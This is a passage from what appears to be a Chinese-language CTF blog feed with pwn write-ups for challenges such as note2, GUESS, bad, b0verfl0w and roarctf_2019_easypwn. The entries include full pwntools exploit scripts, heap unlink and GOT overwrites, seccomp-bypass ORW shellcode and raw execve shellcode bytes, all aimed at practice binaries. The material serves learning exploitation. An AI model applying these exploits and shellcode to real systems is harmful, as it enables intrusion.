        <content type="html"><![CDATA[<p> 没开偏移的保护</p><p>size是无符号数</p><p><img src="https://s2.loli.net/2024/04/28/tRUaW5Y9BfsNqeI.png" alt="image-20240426213934832"></p><p>进函数后变有符号数，会有溢出</p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426214016393.png" alt="image-20240426214016393"></p><p><img src="https://s2.loli.net/2024/04/28/Cj3ytfD9z2euRWx.png" alt="image-20240426190337391"></p><p><img src="https://s2.loli.net/2024/04/28/2mSIchNlVYxzaHZ.png" alt="image-20240426190621665"></p><p><img src="https://s2.loli.net/2024/04/28/qxcdEysoNJZnevh.png" alt="image-20240426190918191"></p><h5 id="这里只能用字节来填充，b’-x00’都不行"><a href="#这里只能用字节来填充，b’-x00’都不行" class="headerlink" title="这里只能用字节来填充，b’\x00’都不行"></a>这里只能用字节来填充，b’\x00’都不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426211910916.png" alt="image-20240426211910916"></p><h5 id="改了free-got才free的，会执行one-gadget"><a href="#改了free-got才free的，会执行one-gadget" class="headerlink" title="改了free_got才free的，会执行one_gadget"></a>改了free_got才free的，会执行one_gadget</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426213312570.png" alt="image-20240426213312570"></p><h5 id="用system打会报错，不行"><a href="#用system打会报错，不行" class="headerlink" title="用system打会报错，不行"></a>用system打会报错，不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426215822432.png" alt="image-20240426215822432"></p><h5 id="因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停"><a href="#因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停" class="headerlink" title="因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停"></a>因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停</h5><p><img src="https://s2.loli.net/2024/04/28/c2k16O4aoGXNPDB.png" alt="image-20240426213647135"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",27431)</span></span><br><span class="line">p=process(<span class="string">"./note2"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./note2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">' name:'</span>,<span class="string">'sdf'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'address:'</span>,<span class="string">'asdf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'(less than 128)'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">' content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, choice, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">"]"</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">io.recvuntil(":")</span></span><br><span class="line"><span class="string">io.sendline("/bin/sh") #name</span></span><br><span class="line"><span class="string">io.recvuntil(":")</span></span><br><span class="line"><span class="string">io.sendline("ddd")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">ptr=<span class="number">0x602120</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'\x00'</span>*<span class="number">8</span>+p64(<span class="number">0xa1</span>)+p64(fd)+p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'sadf'</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'bin/sh'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#b'a'*0x18</span></span><br><span class="line">free_got=elf.got[<span class="string">'free'</span>]</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x18</span>+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">base=addr-libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one=base+<span class="number">0xf02a4</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_final_5</title>
      <link href="//posts/4595fad/"/>
      <url>//posts/4595fad/</url>
      
        <content type="html"><![CDATA[<h5 id="没开偏移的保护"><a href="#没开偏移的保护" class="headerlink" title="没开偏移的保护"></a>没开偏移的保护</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193750286.png" alt="image-20240411193750286"></p><p>地址进行或运算后保存，最后一位存index</p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193908492.png" alt="image-20240411193908492"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194425445.png" alt="image-20240411194425445"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194802328.png" alt="image-20240411194802328"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411195346375.png" alt="image-20240411195346375"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GUESS</title>
      <link href="//posts/c587cd26/"/>
      <url>//posts/c587cd26/</url>
      
        <content type="html"><![CDATA[<p>开了canary</p><p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p><h5 id="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数"><a href="#在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数" class="headerlink" title="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数"></a>在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p><h5 id="把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"><a href="#把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移" class="headerlink" title="把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"></a>把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移</h5><h5 id="本地一直打不通，调试也有问题"><a href="#本地一直打不通，调试也有问题" class="headerlink" title="本地一直打不通，调试也有问题"></a>本地一直打不通，调试也有问题</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",26222)</span></span><br><span class="line">p=process(<span class="string">"./GUESS"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(<span class="string">'./GUESS'</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">' guessing flag'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">environ=base+libc.sym[<span class="string">'__environ'</span>]</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x128</span>+p64(environ)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">' guessing flag'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">envi=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(envi))</span><br><span class="line">flag=envi-<span class="number">0x168</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x128</span>+p64(flag)</span><br><span class="line">p.recvuntil(<span class="string">' guessing flag'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bad</title>
      <link href="//posts/822b39fb/"/>
      <url>//posts/822b39fb/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/21/eN68l.png" alt="image-20240322140930289"></p><p><img src="https://i0.imgs.ovh/2024/03/21/eNkFd.png" alt="image-20240322141022925"></p><p><img src="https://i0.imgs.ovh/2024/03/21/eN0sK.png" alt="image-20240322141035709"></p><h5 id="很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"><a href="#很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用" class="headerlink" title="很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"></a>很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用</h5><h5 id="seccomp-init-0LL-是初始化seccomp-init函数"><a href="#seccomp-init-0LL-是初始化seccomp-init函数" class="headerlink" title="seccomp_init(0LL);是初始化seccomp_init函数"></a><strong><em>seccomp_init(0LL);</em></strong>是初始化seccomp_init函数</h5><h5 id="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"><a href="#0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用" class="headerlink" title="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"></a><strong><em>0，1，2，60</em></strong>，分别是允许进程可读，可写，可执行，和退出的系统调用</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eNBi2.png" alt="image-20240322141910159"></p><h5 id="所以这道题只能用orw的方式获取flag"><a href="#所以这道题只能用orw的方式获取flag" class="headerlink" title="所以这道题只能用orw的方式获取flag"></a>所以这道题只能用orw的方式获取flag</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line">orw_payload=shellcraft.<span class="built_in">open</span>(<span class="string">'./flag'</span>) <span class="comment">#打开根目录下的flag文件，文件标识符为3</span></span><br><span class="line">orw_payload+=shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>) <span class="comment">#读取文件标识符为3的文件的0x50个字节到地址mmap</span></span><br><span class="line">orw_payload+=shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>) <span class="comment">#将mmap的地址的值输出</span></span><br></pre></td></tr></tbody></table></figure><h5 id="不把orw-payload写到栈上因为其很大"><a href="#不把orw-payload写到栈上因为其很大" class="headerlink" title="不把orw_payload写到栈上因为其很大"></a>不把orw_payload写到栈上因为其很大</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eaafo.png" alt="image-20240322151355993"></p><h5 id="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"><a href="#所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上" class="headerlink" title="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"></a>所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上</h5><p><img src="https://i0.imgs.ovh/2024/03/21/ea9JH.png" alt="image-20240322151126619"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jmp_rsp_ret=asm(<span class="string">'sub rsp,0x30;jmp rsp'</span>)</span><br><span class="line">get_shell=asm(<span class="string">'mov rax,0x123000;call rax'</span>)</span><br><span class="line">payload=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+get_shell</span><br><span class="line">payload=payload.ljust(<span class="number">0x28</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload+=p64(jmp_rsp)+jmp_rsp_ret<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><h5 id="实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。"><a href="#实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。" class="headerlink" title="实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。"></a>实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。</h5><h5 id="最后再写入orw-payload就行了"><a href="#最后再写入orw-payload就行了" class="headerlink" title="最后再写入orw_payload就行了"></a>最后再写入orw_payload就行了</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(asm(orw_payload))</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b0verfl0w</title>
      <link href="//posts/b656e51/"/>
      <url>//posts/b656e51/</url>
      
        <content type="html"><![CDATA[<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; 汇编指令</span><br><span class="line">xor ecx, ecx          ; 将 ecx 寄存器清零</span><br><span class="line">mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * <span class="number">0</span></span><br><span class="line">push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 <span class="number">0</span></span><br><span class="line">push <span class="number">0x68732f2f</span>       ; 将字符串 <span class="string">"/bin//sh"</span> 的 ASCII 码逆序压入栈</span><br><span class="line">push <span class="number">0x6e69622f</span>       ; 继续将字符串 <span class="string">"/bin//sh"</span> 的 ASCII 码逆序压入栈</span><br><span class="line">mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 <span class="string">"/bin//sh"</span> 的地址）存放到 ebx 寄存器中</span><br><span class="line">mov al, <span class="number">0xb</span>           ; 将 <span class="number">0xb</span> 存放到 al 寄存器中，该值代表 execve 系统调用的编号</span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>              ; 触发系统调用，执行 execve(<span class="string">"/bin//sh"</span>, NULL, NULL)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>+<span class="string">b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>+<span class="string">b"\x0b\xcd\x80"</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p><h5 id="ret2shellcode-但是大小不够了"><a href="#ret2shellcode-但是大小不够了" class="headerlink" title="ret2shellcode,但是大小不够了"></a>ret2shellcode,但是大小不够了</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_esp_jmp=asm(<span class="string">"sub esp,0x28;jmp esp"</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="改写其他不行"><a href="#改写其他不行" class="headerlink" title="改写其他不行"></a>改写其他不行</h5><h5 id="返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址"><a href="#返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址" class="headerlink" title="返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址"></a>返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=asm(shellcode)+<span class="string">b'a'</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode))+<span class="string">b'aaaa'</span>+p32(jmp_esp)+sup_esp_jmp</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p><p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p><p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p><h5 id="jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶"><a href="#jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶" class="headerlink" title="jmp esp的操作，把栈顶设为esp,同时eip指向栈顶"></a>jmp esp的操作，把栈顶设为esp,同时eip指向栈顶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",28594)</span></span><br><span class="line">p=process(<span class="string">"./b0verfl0w"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>+<span class="string">b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>+<span class="string">b"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">jmp_esp=<span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp=asm(<span class="string">"sub esp,0x28;jmp esp"</span>)</span><br><span class="line">payload=shellcode+<span class="string">b'a'</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode))+<span class="string">b'aaaa'</span>+p32(jmp_esp)+sub_esp_jmp</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>roarctf_2019_easypwn</title>
      <link href="//posts/29aca647/"/>
      <url>//posts/29aca647/</url>
      
        <content type="html"><![CDATA[<p> 保护全开</p><p>edit函数</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p><p>若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p><h4 id="这里不太懂为什么伪造的堆1-free不会报错"><a href="#这里不太懂为什么伪造的堆1-free不会报错" class="headerlink" title="这里不太懂为什么伪造的堆1 free不会报错"></a>这里不太懂为什么伪造的堆1 free不会报错</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p><p>试用这种方法也能show出main_arena</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p><h4 id="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"><a href="#至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小" class="headerlink" title="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"></a>至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="奇怪，这里再申请0x80的大小，然后size还是0xa1"><a href="#奇怪，这里再申请0x80的大小，然后size还是0xa1" class="headerlink" title="奇怪，这里再申请0x80的大小，然后size还是0xa1"></a>奇怪，这里再申请0x80的大小，然后size还是0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p><h5 id="这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21"><a href="#这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21" class="headerlink" title="这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)"></a>这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x21</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" 